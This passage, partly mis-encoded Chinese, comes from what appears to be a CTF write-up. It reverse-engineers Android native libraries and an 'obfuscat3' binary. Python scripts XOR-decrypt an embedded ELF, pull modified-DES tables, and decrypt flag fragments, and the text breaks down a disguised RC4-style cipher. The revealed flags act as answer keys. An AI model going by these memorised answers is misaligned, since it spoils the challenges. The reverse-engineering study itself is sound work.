        print(f"\nğŸ“ è®¡ç®—å‡ºçš„æ–‡ä»¶åç§»: 0x{encrypted_so_offset:X}")

        try:
            with open('libwrapper.so', 'rb') as f:
                f.seek(encrypted_so_offset)
                sample = f.read(16)
                print(f"   è¯¥ä½ç½®çš„å‰16å­—èŠ‚: {' '.join(f'{b:02X}' for b in sample)}")
                # æµ‹è¯•è§£å¯†
                decrypted = bytes([b ^ 0xAA for b in sample])
                if decrypted[:4] == b'\x7fELF':
                    print("   âœ… ç¡®è®¤æ˜¯åŠ å¯†çš„ELF!")
                else:
                    print("   âš ï¸ ä¸åƒæ˜¯åŠ å¯†çš„ELF")
        except:
            pass

    # æ–¹æ³•2ï¼šç›´æ¥æœç´¢
    extract_encrypted_so_direct()


# æ‰§è¡Œ
if __name__ == "__main__":
    extract_with_both_methods()
```

å‡¿å‡ºæ¥å°±èƒ½çœ‹åˆ°RC4äº†ï¼Œå¯†é’¥ç”¨mysecret

è§£å‡ºæ¥

```
Th3_R3@l
```



flag3æ‡’å¾—ï¼ˆä¸ä¼šï¼‰åŠ¨è°ƒ

å…ˆè®©aiæå–ä¸€ä¸‹æ•°æ®
è„šæœ¬

```
#!/usr/bin/env python3
"""
ä» libfunction3.so æå–é­”æ”¹DESçš„æ‰€æœ‰è¡¨å’Œå¯†é’¥
"""

import struct
import sys


def read_int_array(f, offset, count):
    """è¯»å–intæ•°ç»„ (4å­—èŠ‚å°ç«¯åº)"""
    f.seek(offset)
    data = f.read(count * 4)
    return list(struct.unpack(f'<{count}I', data))


def read_bytes(f, offset, count):
    """è¯»å–å­—èŠ‚æ•°ç»„"""
    f.seek(offset)
    return f.read(count)


def extract_des_data(so_file):
    """æå–æ‰€æœ‰DESç›¸å…³æ•°æ®"""

    # âš ï¸ è¿™äº›åç§»æ˜¯ç›¸å¯¹äº.rodataæ®µçš„è™šæ‹Ÿåœ°å€
    # éœ€è¦è½¬æ¢ä¸ºæ–‡ä»¶åç§»

    # æ­¥éª¤1: æ‰¾åˆ°.rodataæ®µåœ¨æ–‡ä»¶ä¸­çš„å®é™…åç§»
    with open(so_file, 'rb') as f:
        # è¯»å–ELFå¤´
        f.seek(0)
        elf_magic = f.read(4)
        if elf_magic != b'\x7fELF':
            print("âŒ ä¸æ˜¯æœ‰æ•ˆçš„ELFæ–‡ä»¶")
            return

        # è¯»å–64ä½ELFçš„ç¨‹åºå¤´åç§»
        f.seek(0x20)  # e_phoff
        phoff = struct.unpack('<Q', f.read(8))[0]

        f.seek(0x36)  # e_phnum
        phnum = struct.unpack('<H', f.read(2))[0]

        # æŸ¥æ‰¾åŒ…å«.rodataçš„LOADæ®µ
        rodata_file_offset = None
        rodata_vaddr = None

        for i in range(phnum):
            f.seek(phoff + i * 0x38)
            p_type = struct.unpack('<I', f.read(4))[0]

            if p_type == 1:  # PT_LOAD
                f.seek(phoff + i * 0x38 + 0x08)
                p_offset = struct.unpack('<Q', f.read(8))[0]
                p_vaddr = struct.unpack('<Q', f.read(8))[0]
                p_filesz = struct.unpack('<Q', f.read(8))[0]

                # æ£€æŸ¥æ˜¯å¦åŒ…å«0x1520
                if p_vaddr <= 0x1520 < p_vaddr + p_filesz:
                    rodata_file_offset = p_offset
                    rodata_vaddr = p_vaddr
                    print(f"âœ… æ‰¾åˆ°.rodataæ®µ: vaddr=0x{p_vaddr:X}, file_offset=0x{p_offset:X}")
                    break

        if rodata_file_offset is None:
            print("âŒ æ‰¾ä¸åˆ°.rodataæ®µï¼Œå°è¯•æ‰‹åŠ¨åç§»...")
            # é€šå¸¸.rodataåœ¨ç¬¬ä¸€ä¸ªLOADæ®µä¸­ï¼Œå°è¯•åç§»0
            rodata_file_offset = 0
            rodata_vaddr = 0

    # è®¡ç®—æ–‡ä»¶åç§»çš„è¾…åŠ©å‡½æ•°
    def vaddr_to_foffset(vaddr):
        return vaddr - rodata_vaddr + rodata_file_offset

    with open(so_file, 'rb') as f:
        print("\n" + "=" * 60)
        print("å¼€å§‹æå–æ•°æ®...")
        print("=" * 60)

        # æå–å¯†é’¥
        print("\nğŸ”‘ DESå¯†é’¥ (0x1520):")
        key = read_bytes(f, vaddr_to_foffset(0x1520), 8)
        print(f"unsigned char key[8] = {{{', '.join(f'0x{b:02X}' for b in key)}}};")

        # æå–PC-1ç½®æ¢è¡¨ (56ä¸ªint)
        print("\nğŸ“‹ PC-1 ç½®æ¢è¡¨ (0x800):")
        pc1 = read_int_array(f, vaddr_to_foffset(0x800), 56)
        print(f"int PC1[56] = {{")
        for i in range(0, 56, 8):
            print(f"    {', '.join(f'{x:3d}' for x in pc1[i:i + 8])},")
        print("};")

        # æå–è½®ç§»ä½æ•° (16ä¸ªint)
        print("\nğŸ”„ è½®ç§»ä½è¡¨ (0x8E0):")
        shifts = read_int_array(f, vaddr_to_foffset(0x8E0), 16)
        print(f"int SHIFTS[16] = {{{', '.join(map(str, shifts))}}};")

        # æå–PC-2ç½®æ¢è¡¨ (48ä¸ªint)
        print("\nğŸ“‹ PC-2 ç½®æ¢è¡¨ (0x920):")
        pc2 = read_int_array(f, vaddr_to_foffset(0x920), 48)
        print(f"int PC2[48] = {{")
        for i in range(0, 48, 8):
            print(f"    {', '.join(f'{x:3d}' for x in pc2[i:i + 8])},")
        print("};")

        # æå–Eæ‰©å±•è¡¨ (48ä¸ªint)
        print("\nğŸ“‹ E æ‰©å±•è¡¨ (0x9E0):")
        e_table = read_int_array(f, vaddr_to_foffset(0x9E0), 48)
        print(f"int E[48] = {{")
        for i in range(0, 48, 8):
            print(f"    {', '.join(f'{x:3d}' for x in e_table[i:i + 8])},")
        print("};")

        # æå–Sç›’ (8Ã—64 = 512ä¸ªint)
        print("\nğŸ“¦ Sç›’ (0xAA0):")
        sboxes = read_int_array(f, vaddr_to_foffset(0xAA0), 512)
        print(f"int SBOX[8][64] = {{")
        for box in range(8):
            print(f"    {{ // S{box + 1}")
            for row in range(4):
                start = box * 64 + row * 16
                print(f"        {', '.join(f'{x:2d}' for x in sboxes[start:start + 16])},")
            print("    },")
        print("};")

        # æå–Pç½®æ¢è¡¨ (32ä¸ªint)
        print("\nğŸ“‹ P ç½®æ¢è¡¨ (0x12A0):")
        p_table = read_int_array(f, vaddr_to_foffset(0x12A0), 32)
        print(f"int P[32] = {{")
        for i in range(0, 32, 8):
            print(f"    {', '.join(f'{x:3d}' for x in p_table[i:i + 8])},")
        print("};")

        # æå–IPç½®æ¢è¡¨ (64ä¸ªint)
        print("\nğŸ“‹ IP åˆå§‹ç½®æ¢è¡¨ (0x1320):")
        ip_table = read_int_array(f, vaddr_to_foffset(0x1320), 64)
        print(f"int IP[64] = {{")
        for i in range(0, 64, 8):
            print(f"    {', '.join(f'{x:3d}' for x in ip_table[i:i + 8])},")
        print("};")

        # æå–FPç½®æ¢è¡¨ (64ä¸ªint)
        print("\nğŸ“‹ FP æœ€ç»ˆç½®æ¢è¡¨ (0x1420):")
        fp_table = read_int_array(f, vaddr_to_foffset(0x1420), 64)
        print(f"int FP[64] = {{")
        for i in range(0, 64, 8):
            print(f"    {', '.join(f'{x:3d}' for x in fp_table[i:i + 8])},")
        print("};")

        print("\n" + "=" * 60)
        print("âœ… æå–å®Œæˆï¼")
        print("=" * 60)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("ç”¨æ³•: python3 extract_des.py libfunction3.so")
        sys.exit(1)

    extract_des_data(sys.argv[1])
```



```
D:\CTF-competition\2025-Geek Challenge\RE\android\1\lib\x86_64>python extract_des.py libfunction3.so
âŒ æ‰¾ä¸åˆ°.rodataæ®µï¼Œå°è¯•æ‰‹åŠ¨åç§»...

============================================================
å¼€å§‹æå–æ•°æ®...
============================================================

ğŸ”‘ DESå¯†é’¥ (0x1520):
unsigned char key[8] = {0x13, 0x34, 0x57, 0x79, 0x9B, 0xBC, 0xDF, 0xF1};

ğŸ“‹ PC-1 ç½®æ¢è¡¨ (0x800):
int PC1[56] = {
     57,  49,  41,  33,  25,  17,   9,   1,
     58,  50,  42,  34,  26,  18,  10,   2,
     59,  51,  43,  35,  27,  19,  11,   3,
     60,  52,  44,  36,  63,  55,  47,  39,
     31,  23,  15,   7,  62,  54,  46,  38,
     30,  22,  14,   6,  61,  53,  45,  37,
     29,  21,  13,   5,  28,  20,  12,   4,
};

ğŸ”„ è½®ç§»ä½è¡¨ (0x8E0):
int SHIFTS[16] = {1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1};

ğŸ“‹ PC-2 ç½®æ¢è¡¨ (0x920):
int PC2[48] = {
     14,  17,  11,  24,   1,   5,   3,  28,
     15,   6,  21,  10,  23,  19,  12,   4,
     26,   8,  16,   7,  27,  20,  13,   2,
     41,  52,  31,  37,  47,  55,  30,  40,
     51,  45,  33,  48,  44,  49,  39,  56,
     34,  53,  46,  42,  50,  36,  29,  32,
};

ğŸ“‹ E æ‰©å±•è¡¨ (0x9E0):
int E[48] = {
     32,   1,   2,   3,   4,   5,   4,   5,
      6,   7,   8,   9,   8,   9,  10,  11,
     12,  13,  12,  13,  14,  15,  16,  17,
     16,  17,  18,  19,  20,  21,  20,  21,
     22,  23,  24,  25,  24,  25,  26,  27,
     28,  29,  28,  29,  30,  31,  32,   1,
};

ğŸ“¦ Sç›’ (0xAA0):
int SBOX[8][64] = {
    { // S1
        14,  4, 13,  1,  2, 15, 11,  8,  3, 10,  6, 12,  5,  9,  0,  7,
         0, 15,  7,  4, 14,  2, 13,  1, 10,  6, 12, 11,  9,  5,  3,  8,
         4,  1, 14,  8, 13,  6,  2, 11, 15, 12,  9,  7,  3, 10,  5,  0,
        15, 12,  8,  2,  4,  9,  1,  7,  5, 11,  3, 14, 10,  0,  6, 13,
    },
    { // S2
        15,  1,  8, 14,  6, 11,  3,  4,  9,  7,  2, 13, 12,  0,  5, 10,
         3, 13,  4,  7, 15,  2,  8, 14, 12,  0,  1, 10,  6,  9, 11,  5,
         0, 14,  7, 11, 10,  4, 13,  1,  5,  8, 12,  6,  9,  3,  2, 15,
        13,  8, 10,  1,  3, 15,  4,  2, 11,  6,  7, 12,  0,  5, 14,  9,
    },
    { // S3
        10,  0,  9, 14,  6,  3, 15,  5,  1, 13, 12,  7, 11,  4,  2,  8,
        13,  7,  0,  9,  3,  4,  6, 10,  2,  8,  5, 14, 12, 11, 15,  1,
        13,  6,  4,  9,  8, 15,  3,  0, 11,  1,  2, 12,  5, 10, 14,  7,
         1, 10, 13,  0,  6,  9,  8,  7,  4, 15, 14,  3, 11,  5,  2, 12,
    },
    { // S4
         7, 13, 14,  3,  0,  6,  9, 10,  1,  2,  8,  5, 11, 12,  4, 15,
        13,  8, 11,  5,  6, 15,  0,  3,  4,  7,  2, 12,  1, 10, 14,  9,
        10,  6,  9,  0, 12, 11,  7, 13, 15,  1,  3, 14,  5,  2,  8,  4,
         3, 15,  0,  6, 10,  1, 13,  8,  9,  4,  5, 11, 12,  7,  2, 14,
    },
    { // S5
         2, 12,  4,  1,  7, 10, 11,  6,  8,  5,  3, 15, 13,  0, 14,  9,
        14, 11,  2, 12,  4,  7, 13,  1,  5,  0, 15, 10,  3,  9,  8,  6,
         4,  2,  1, 11, 10, 13,  7,  8, 15,  9, 12,  5,  6,  3,  0, 14,
        11,  8, 12,  7,  1, 14,  2, 13,  6, 15,  0,  9, 10,  4,  5,  3,
    },
    { // S6
        12,  1, 10, 15,  9,  2,  6,  8,  0, 13,  3,  4, 14,  7,  5, 11,
        10, 15,  4,  2,  7, 12,  9,  5,  6,  1, 13, 14,  0, 11,  3,  8,
         9, 14, 15,  5,  2,  8, 12,  3,  7,  0,  4, 10,  1, 13, 11,  6,
         4,  3,  2, 12,  9,  5, 15, 10, 11, 14,  1,  7,  6,  0,  8, 13,
    },
    { // S7
         4, 11,  2, 14, 15,  0,  8, 13,  3, 12,  9,  7,  5, 10,  6,  1,
        13,  0, 11,  7,  4,  9,  1, 10, 14,  3,  5, 12,  2, 15,  8,  6,
         1,  4, 11, 13, 12,  3,  7, 10, 15,  6,  8,  0,  5,  9, 14,  2,
         6, 11, 13,  8,  1,  4, 10,  7,  9,  5,  0, 15, 14,  2,  3, 12,
    },
    { // S8
         0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
         0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
         0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
         0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,
    },
};

ğŸ“‹ P ç½®æ¢è¡¨ (0x12A0):
int P[32] = {
     16,   7,  20,  21,  29,  12,  28,  17,
      1,  15,  23,  26,   5,  18,  31,  10,
      2,   8,  24,  14,  32,  27,   3,   9,
     19,  13,  30,   6,  22,  11,   4,  25,
};

ğŸ“‹ IP åˆå§‹ç½®æ¢è¡¨ (0x1320):
int IP[64] = {
     58,  50,  42,  34,  26,  18,  10,   2,
     60,  52,  44,  36,  28,  20,  12,   4,
     62,  54,  46,  38,  30,  22,  14,   6,
     64,  56,  48,  40,  32,  24,  16,   8,
     57,  49,  41,  33,  25,  17,   9,   1,
     59,  51,  43,  35,  27,  19,  11,   3,
     61,  53,  45,  37,  29,  21,  13,   5,
     63,  55,  47,  39,  31,  23,  15,   7,
};

ğŸ“‹ FP æœ€ç»ˆç½®æ¢è¡¨ (0x1420):
int FP[64] = {
     40,   8,  48,  16,  56,  24,  64,  32,
     39,   7,  47,  15,  55,  23,  63,  31,
     38,   6,  46,  14,  54,  22,  62,  30,
     37,   5,  45,  13,  53,  21,  61,  29,
     36,   4,  44,  12,  52,  20,  60,  28,
     35,   3,  43,  11,  51,  19,  59,  27,
     34,   2,  42,  10,  50,  18,  58,  26,
     33,   1,  41,   9,  49,  17,  57,  25,
};

============================================================
âœ… æå–å®Œæˆï¼
============================================================
```

aiè§£å¯†è„šæœ¬

```
#!/usr/bin/env python3
"""é­”æ”¹DESè§£å¯†å™¨ - å®Œæ•´ä¿®å¤ç‰ˆ"""

KEY = bytes([0x13, 0x34, 0x57, 0x79, 0x9B, 0xBC, 0xDF, 0xF1])
CIPHERTEXT = bytes([0xAE, 0xBC, 0xDE, 0x9B, 0x24, 0x02, 0x9C, 0xA7])

# æ ‡å‡†DESè¡¨ï¼ˆæœªé­”æ”¹ï¼‰
PC1 = [57,49,41,33,25,17,9,1,58,50,42,34,26,18,10,2,59,51,43,35,27,19,11,3,60,52,44,36,63,55,47,39,31,23,15,7,62,54,46,38,30,22,14,6,61,53,45,37,29,21,13,5,28,20,12,4]
SHIFTS = [1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1]
PC2 = [14,17,11,24,1,5,3,28,15,6,21,10,23,19,12,4,26,8,16,7,27,20,13,2,41,52,31,37,47,55,30,40,51,45,33,48,44,49,39,56,34,53,46,42,50,36,29,32]
E = [32,1,2,3,4,5,4,5,6,7,8,9,8,9,10,11,12,13,12,13,14,15,16,17,16,17,18,19,20,21,20,21,22,23,24,25,24,25,26,27,28,29,28,29,30,31,32,1]

SBOX = [
    [14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13],
    [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9],
    [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12],
    [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14],
    [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9,14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3],
    [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8,9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13],
    [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,1,4,11,13,12,3,7,10,15,6,8,0,5,9,14,2,6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12],
    [0]*64  # S8å…¨0
]

P = [16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25]
IP = [58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4,62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8,57,49,41,33,25,17,9,1,59,51,43,35,27,19,11,3,61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7]
FP = [40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29,36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25]

def bytes_to_bits(data):
    return [(byte >> (7-i)) & 1 for byte in data for i in range(8)]

def bits_to_bytes(bits):
    return bytes([sum(bits[i*8+j] << (7-j) for j in range(8)) for i in range(len(bits)//8)])

def permute(bits, table):
    return [bits[i-1] for i in table]

def xor_bits(a, b):
    return [x ^ y for x, y in zip(a, b)]

def left_shift_32bit(a_bytes, n):
    """ç²¾ç¡®æ¨¡æ‹ŸCä»£ç çš„4å­—èŠ‚å¾ªç¯å·¦ç§»"""
    a = list(a_bytes)
    v4 = a[0] >> (8 - n)
    for i in range(3):
        a[i] = ((a[i+1] >> (8 - n)) | (a[i] << n)) & 0xFF
    a[3] = (v4 | (a[3] << n)) & 0xFF
    return bytes(a)

def generate_subkeys_modified(key_bytes):
    """é­”æ”¹çš„å­å¯†é’¥ç”Ÿæˆï¼ˆæ¨¡æ‹Ÿé‡å å†…å­˜å¸ƒå±€ï¼‰"""
    key_bits = bytes_to_bits(key_bytes)
    
    # PC1: 64ä½ â†’ 56ä½
    pc1_bits = permute(key_bits, PC1)
    s_bytes = bits_to_bytes(pc1_bits)  # 7å­—èŠ‚
    
    # æ¨¡æ‹Ÿé‡å ï¼šCå’ŒDæœ‰1å­—èŠ‚é‡å 
    # C = s[0..3] (å‰32ä½ï¼Œ28ä½æœ‰æ•ˆ)
    # D = s[3..6] (å28ä½ï¼Œç¬¬1å­—èŠ‚å’ŒC[3]é‡å )
    C = s_bytes[0:4]
    D = s_bytes[3:7]  # æ³¨æ„ï¼šDä»s[3]å¼€å§‹ï¼
    
    subkeys = []
    for i in range(16):
        # å¾ªç¯å·¦ç§»
        C = left_shift_32bit(C, SHIFTS[i])
        D = left_shift_32bit(D, SHIFTS[i])
        
        # æ¨¡æ‹Ÿæ ˆæº¢å‡ºçš„æ‹¼æ¥æ–¹å¼
        # v4[0..2] = C[0..2]ï¼Œv5[0..3] = D[0..3]
        # permuteè¯»å–ï¼šC[0..2] + D[0..3] = 7å­—èŠ‚
        cd_bytes = C[0:3] + D[0:4]  # 7å­—èŠ‚
        cd_bits = bytes_to_bits(cd_bytes)  # 56ä½
        
        # PC2: 56ä½ â†’ 48ä½
        subkey = permute(cd_bits, PC2)
        subkeys.append(subkey)
    
    return subkeys

def s_box_modified(bits48):
    """é­”æ”¹çš„Sç›’ï¼ˆæ‰“åŒ…æ–¹å¼ä¸åŒï¼‰"""
    result_bytes = [0, 0, 0, 0]
    
    for j in range(8):
        block = bits48[j*6:(j+1)*6]
        row = (block[0] << 1) | block[5]
        col = (block[1] << 3) | (block[2] << 2) | (block[3] << 1) | block[4]
        val = SBOX[j][row * 16 + col]
        
        # é­”æ”¹ç‚¹ï¼šå¶æ•°Sç›’å·¦ç§»4ä½
        if j % 2 == 0:
            v3 = 16 * val
        else:
            v3 = val
        
        result_bytes[j // 2] |= v3
    
    return bytes_to_bits(bytes(result_bytes))

def feistel(R, subkey):
    expanded = permute(R, E)
    xored = xor_bits(expanded, subkey)
    substituted = s_box_modified(xored)
    return permute(substituted, P)

def des_decrypt(ciphertext, key):
    cipher_bits = bytes_to_bits(ciphertext)
    key_bits = bytes_to_bits(key)
    
    subkeys = generate_subkeys_modified(key)
    
    ip_result = permute(cipher_bits, IP)
    L = ip_result[:32]
    R = ip_result[32:]
    
    # è§£å¯†ï¼šé€†åºä½¿ç”¨å­å¯†é’¥
    for i in range(16):
        temp = R[:]
        R = xor_bits(L, feistel(R, subkeys[15 - i]))
        L = temp
    
    # æœ€ç»ˆç½®æ¢ï¼ˆæ ‡å‡†DESæ˜¯R+Lï¼‰
    combined = R + L
    result = permute(combined, FP)
    
    return bits_to_bytes(result)

if __name__ == "__main__":
    print("="*70)
    print("ğŸ”“ é­”æ”¹DESè§£å¯†å™¨ - å®Œæ•´ä¿®å¤ç‰ˆ")
    print("="*70)
    
    print(f"\nğŸ”‘ å¯†é’¥: {KEY.hex().upper()}")
    print(f"ğŸ”’ å¯†æ–‡: {CIPHERTEXT.hex().upper()}")
    
    print("\nğŸ¯ é­”æ”¹ç‚¹ï¼š")
    print("  1. å­å¯†é’¥ç”Ÿæˆï¼šCå’ŒDæœ‰1å­—èŠ‚é‡å ï¼ˆs[3]åŒæ—¶å±äºCå’ŒDï¼‰")
    print("  2. å­å¯†é’¥æ‹¼æ¥ï¼šæ ˆæº¢å‡ºå¯¼è‡´ç‰¹æ®Šçš„å†…å­˜å¸ƒå±€")
    print("  3. Sç›’æ‰“åŒ…ï¼šå¶æ•°Sç›’å·¦ç§»4ä½ï¼Œå¥‡æ•°Sç›’ä¸ç§»ä½")
    
    plaintext = des_decrypt(CIPHERTEXT, KEY)
    
    print(f"\nâœ… æ˜æ–‡ (hex): {plaintext.hex().upper()}")
    try:
        plain_str = plaintext.decode('ascii')
        print(f"âœ… æ˜æ–‡ (ascii): {plain_str}")
        print(f"\nğŸ¯ input3 = \"{plain_str}\"")
    except:
        print(f"âœ… æ˜æ–‡ (raw): {plaintext}")
        print(f"\nğŸ¯ input3 = {plaintext}")
    
    print("="*70)
```

```
======================================================================
ğŸ”“ é­”æ”¹DESè§£å¯†å™¨ - å®Œæ•´ä¿®å¤ç‰ˆ
======================================================================

ğŸ”‘ å¯†é’¥: 133457799BBCDFF1
ğŸ”’ å¯†æ–‡: AEBCDE9B24029CA7

ğŸ¯ é­”æ”¹ç‚¹ï¼š
  1. å­å¯†é’¥ç”Ÿæˆï¼šCå’ŒDæœ‰1å­—èŠ‚é‡å ï¼ˆs[3]åŒæ—¶å±äºCå’ŒDï¼‰
  2. å­å¯†é’¥æ‹¼æ¥ï¼šæ ˆæº¢å‡ºå¯¼è‡´ç‰¹æ®Šçš„å†…å­˜å¸ƒå±€
  3. Sç›’æ‰“åŒ…ï¼šå¶æ•°Sç›’å·¦ç§»4ä½ï¼Œå¥‡æ•°Sç›’ä¸ç§»ä½

âœ… æ˜æ–‡ (hex): 6C795F4631616721
âœ… æ˜æ–‡ (ascii): ly_F1ag!

ğŸ¯ input3 = "ly_F1ag!"
```

æœ€å

```
Th1s_1s_Th3_R3@lly_F1ag!
```

# obfuscat3

------

## 1. ç¨‹åºé€»è¾‘ / ç®—æ³•åˆ†æ

### 1.1 main

```c
v5 = 0x617261736D6153LL;
scanf("%s", s);
n_4 = strlen((const char *)s);
obf_encode(s, n_4, (unsigned __int8 *)&v5);
if ( n_4 == 183 && !memcmp(s, (const void *)(unsigned int)&cipher, 0xB7u) )
    ...
```

- ç¨‹åºè¯»å…¥ `s`ï¼Œé•¿åº¦å¿…é¡»ä¸º **183**ã€‚

- `v5` è¿™ä¸ª 64 ä½å¸¸é‡æ˜¯å…³é”®ï¼š
  å°ç«¯å±•å¼€ï¼š

  ```c
  0x617261736D6153 --> b"Samsara\x00"
  ```

  æ‰€ä»¥ key å­—ç¬¦ä¸²å…¶å®æ˜¯ `"Samsara"`ã€‚

- `obf_encode` å¯¹ `s` åŸåœ°åŠ å¯†åï¼Œä¸å…¨å±€ `cipher` æ•°ç»„æ¯”è¾ƒã€‚

**ç»“è®ºï¼š**
 `obf_encode(input, len, "Samsara") == cipher`ï¼Œ
 æ‰€ä»¥è¦è§£å¯†å°±æ˜¯åè¿‡æ¥ï¼ŒæŠŠ `cipher` è¿˜åŸæˆåŸå§‹è¾“å…¥ï¼ˆflagï¼‰ã€‚

### 1.2 init_encode â€” RC4 çš„ KSA

```c
for ( i = 0; i < 0x100; ++i )
    mysterious_box[i] = i;    // S[i] = i

v23 = strlen(s);              // key é•¿åº¦
for ( j = 0; j < 256; ++j )
{
    v22[j] = s[j % v23];      // æŠŠ key æŒ‰å­—èŠ‚å¾ªç¯å¡«å…¥
}
...
for ( k = 0; k < 256; ++k )
{
    // ä¸€å¤§å¨ä½è¿ç®—ï¼Œæœ€åï¼š
    v20 = (int)(...æŸä¸ªè¡¨è¾¾å¼...) % 256;
    exchange_encode(&mysterious_box[k], &mysterious_box[v20]);
}
```

ç»“æ„å¾ˆæ˜æ˜¾ï¼š

- `mysterious_box[256]` åˆå§‹åŒ–ä¸º `0..255`ï¼Œ
- ç”¨ key å­—èŠ‚ `v22[k] = key[k % keylen]`ï¼Œ
- å¾ªç¯ 0..255ï¼Œç»´æŠ¤ä¸€ä¸ª index `v20`ï¼Œå¹¶ä¸æ–­è°ƒç”¨ `exchange_encode` äº¤æ¢ `mysterious_box[k]` å’Œ `mysterious_box[v20]`ã€‚

è¿™å°±æ˜¯å…¸å‹ **RC4 KSA**ï¼ˆKey Scheduling Algorithmï¼‰ çš„ç»“æ„ï¼Œåªæ˜¯ï¼š

- ä¼ ç»Ÿ RC4ï¼š`j = (j + S[i] + key[i mod keylen]) & 0xff;`
- è¿™é‡Œç”¨ä¸€å †â€œå‡è£…å¾ˆå¤æ‚â€çš„ä½è¿ç®—æŠŠè¿™äº‹ä¼ªè£…èµ·æ¥ã€‚

### 1.3 obf_encode â€” RC4 çš„ PRGA + åŠ æ³•

æ ¸å¿ƒå¾ªç¯ï¼š

```c
v22 = 0;
v21 = 0;
init_encode(a3);     // ç”¨ "Samsara" åˆå§‹åŒ– mysterious_box

for ( i = 0; i < a2; ++i )
{
    // æ›´æ–° v22ï¼ˆçœ‹èµ·æ¥å¾ˆèŠ±ï¼Œä½†æœ¬è´¨å°±æ˜¯ i = (i+1) & 0xff ä¸€ç±»ï¼‰
    v22 = ... % 256;

    // ä¸€å †é’ˆå¯¹ mysterious_box[v22]ã€v21 çš„ä½è¿ç®—ï¼Œ
    // ç®—å‡ºæ–°çš„ v21ï¼Œå¹¶äº¤æ¢ mysterious_box[v22], mysterious_box[v21]
    exchange_encode((unsigned __int8 *)&mysterious_box[v22],
                    (unsigned __int8 *)&mysterious_box[v21]);

    ...
    a1[i] += mysterious_box[  ...æŸä¸ª index...  ];
}
```

æ¨¡å¼ä¹Ÿéå¸¸åƒ RC4 çš„ PRGAï¼š

- æœ‰ä¸¤ä¸ªç´¢å¼• `v22` / `v21`ï¼ˆå¯¹åº” RC4 ä¸­çš„ i / jï¼‰ï¼›
- æ¯è½®ï¼š
  - æ›´æ–° iã€jï¼ˆè¢«å¤§é‡ä½è¿ç®—ä¼ªè£…èµ·æ¥ï¼‰ï¼›
  - äº¤æ¢ `S[i]` å’Œ `S[j]`ï¼›
  - å†ç”¨ `S[...]` å–ä¸€ä¸ªå­—èŠ‚ä½œä¸º keystreamï¼›
  - ä¸åŒçš„æ˜¯ï¼š**è¿™é‡Œæ˜¯ `a1[i] += keystream`ï¼Œè€Œä¸æ˜¯ `^= keystream`**ã€‚

æ‰€ä»¥æ•´ä½“åŠ å¯†æµç¨‹å°±æ˜¯ï¼š

> ä½¿ç”¨ key `"Samsara"` çš„ **RC4-like** æµå¯†ç ï¼Œ
> ç”Ÿæˆ keystream K[i]ï¼Œ
> ç„¶å `cipher[i] = (plain[i] + K[i]) & 0xff`ã€‚

å› ä¸º keystream åªä¾èµ–äº key å’Œé•¿åº¦ï¼Œä¸æ˜æ–‡æ— å…³ï¼Œæ‰€ä»¥ï¼š

- å¦‚æœæˆ‘ä»¬å…ˆç”¨åŒæ ·çš„ KSA + PRGA ç®—å‡º `K[i]`ï¼Œ
- é‚£ä¹ˆè§£å¯†åªéœ€è¦ï¼š`plain[i] = (cipher[i] - K[i]) & 0xff`ã€‚

è€Œå®é™…ä¸Šï¼Œä½œè€…åªæ˜¯ç”¨å¤æ‚ä½è¿ç®—åŒ…äº†ä¸€å±‚ï¼Œé€»è¾‘ä»ç„¶æ˜¯**æ ‡å‡† RC4**ï¼ˆKSA / PRGA ç»“æ„å…¨åœ¨ï¼‰ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨æ­£å¸¸çš„ RC4 å®ç°å°±èƒ½å¾—åˆ°ä¸€æ ·çš„ keystreamã€‚

------

## 2. è§£å¯†è„šæœ¬ï¼ˆPythonï¼‰

